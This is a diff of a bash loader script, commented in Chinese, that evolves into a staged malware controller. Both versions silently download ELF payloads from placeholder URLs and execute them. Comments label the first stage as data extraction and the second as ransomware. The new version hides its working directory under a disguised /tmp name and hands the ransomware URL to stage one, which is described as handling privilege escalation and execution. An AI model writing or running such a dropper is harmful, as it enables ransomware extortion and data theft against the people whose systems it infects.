@@ -1,47 +1,34 @@
 #!/bin/bash
+# controller.sh
 
-# 定义下载链接（请替换为实际URL）
-URL1="https://example.com/x1.elf" # 提取 重复运行，失败重跑 50次上限，检测成功
-URL2="https://example.com/x2.elf" # 勒索
+set -e
 
-# 并行启动wget静默下载
-wget -q "$URL1" -O x1.sh &
-pid1=$!  # 获取x1下载进程ID
+TMPDIR="/tmp/.sysd-tmp-$(head -c8 /dev/urandom |xxd -p -c8)"
+mkdir -p "$TMPDIR" 2>/dev/null
+cd "$TMPDIR" || exit 1
 
-wget -q "$URL2" -O x2.sh &
-pid2=$!  # 获取x2下载进程ID
+echo "[*] Downloading stage1..."
+URL1="https://example.com/x1.elf"
+URL2="https://example.com/x2.elf"          # ← 这个URL x1也要知道
 
-# 等待x1下载完成
-wait $pid1
+# 只下载第一个阶段
+wget -q --no-cache "$URL1" -O x1.elf || exit 1
+chmod +x x1.elf
 
-# 如果下载失败，退出
-if [ ! -f x1.sh ]; then
-    echo "x1下载失败"
-    exit 1
-fi
+echo "[*] Launching stage1..."
+# 把第二阶段URL通过环境变量或参数传下去（看x1支不支持）
+# 方式A：环境变量（最常用）
+X2_URL="$URL2" ./x1.elf
 
-# 赋予执行权限并运行x1
-chmod +x x1.sh
-./x1.sh
-exit_code=$?
+# 方式B：命令行参数（如果x1支持）
+# ./x1.elf --next-stage "$URL2"
 
-# 检查x1退出码，如果为0或1，则继续
-if [ $exit_code -eq 0 ] || [ $exit_code -eq 1 ]; then
-    # 等待x2下载完成（如果尚未完成）
-    wait $pid2
+# 方式C：x1内部硬编码了URL2（最常见但最不灵活）
+# ./x1.elf
 
-    # 如果下载失败，退出
-    if [ ! -f x2.sh ]; then
-        echo "x2下载失败"
-        exit 1
-    fi
+# 一般到这里控制器就可以退出了
+# x1后续会自己处理下载x2、提权、执行x2等全部流程
+exit 0
 
-    # 赋予执行权限并运行x2
-    chmod +x x2.sh
-    ./x2.sh
-else
-    echo "x1执行失败（退出码: $exit_code），不启动x2"
-fi
 
-# 清理下载文件（可选，根据需要注释掉）
-# rm -f x1.sh x2.sh
+# 思路就是让下载的x1内部去执行这个x2，而不是在外面来执行。
